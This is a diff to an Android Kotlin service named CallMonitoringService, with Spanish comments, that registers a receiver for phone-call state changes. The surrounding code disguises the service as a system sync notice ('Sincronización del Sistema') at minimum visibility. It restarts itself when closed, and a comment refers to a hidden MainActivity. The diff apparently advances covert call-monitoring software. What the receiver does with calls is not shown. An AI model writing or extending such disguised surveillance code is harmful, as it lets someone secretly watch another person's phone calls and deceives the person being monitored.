@@ -8,14 +8,22 @@ import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter // <-- 1. IMPORTANTE: Añadir este import
 import android.os.Build
 import android.os.IBinder
 import android.os.SystemClock
+import android.telephony.TelephonyManager // <-- 2. IMPORTANTE: Añadir este import
+import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.asf.callmonitoring.receiver.PhoneCallReceiver // <-- 3. IMPORTANTE: Importar tu receptor
 
 class CallMonitoringService : Service() {
 
+    // Instancia del receptor para controlarlo dinámicamente
+    private var callReceiver: PhoneCallReceiver? = null
+
     companion object {
+        private const val TAG = "DEBUG_SERVICE" // Etiqueta de depuración
         private const val CHANNEL_ID = "asf_monitoring_channel"
         private const val NOTIFICATION_ID = 1001
 
@@ -38,16 +46,38 @@ class CallMonitoringService : Service() {
         super.onCreate()
         crearCanalNotificacion()
         startForeground(NOTIFICATION_ID, crearNotificacion())
+
+        // --- REGISTRO DINÁMICO CRUCIAL ---
+        // Esto le avisa a Android/HyperOS que este servicio activo quiere escuchar llamadas
+        try {
+            callReceiver = PhoneCallReceiver()
+            val filter = IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED)
+            registerReceiver(callReceiver, filter)
+            Log.d(TAG, "PhoneCallReceiver registrado dinámicamente con éxito.")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error al registrar dinámicamente el PhoneCallReceiver: ${e.message}", e)
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        // Desregistramos el receiver para evitar fugas de memoria si se destruye el servicio
+        try {
+            callReceiver?.let {
+                unregisterReceiver(it)
+                Log.d(TAG, "PhoneCallReceiver desregistrado correctamente.")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error al desregistrar receiver: ${e.message}")
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // START_STICKY le dice al sistema que recree el servicio si el proceso fue terminado
         return START_STICKY
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    // Este método se dispara cuando se fuerza el cierre de la app en recientes
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
 
@@ -74,7 +104,7 @@ class CallMonitoringService : Service() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "Sincronización del Sistema",
-                NotificationManager.IMPORTANCE_MIN // Mínima importancia: sin sonido, sin vibrar y sin ocupar espacio visual fuerte
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
                 description = "Monitoreo continuo en segundo plano"
                 setShowBadge(false)
@@ -85,7 +115,6 @@ class CallMonitoringService : Service() {
     }
 
     private fun crearNotificacion(): Notification {
-        // No le agregamos setContentIntent(pendingIntent) para evitar abrir una MainActivity oculta
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Servicio activo")
             .setContentText("Sincronizando información")
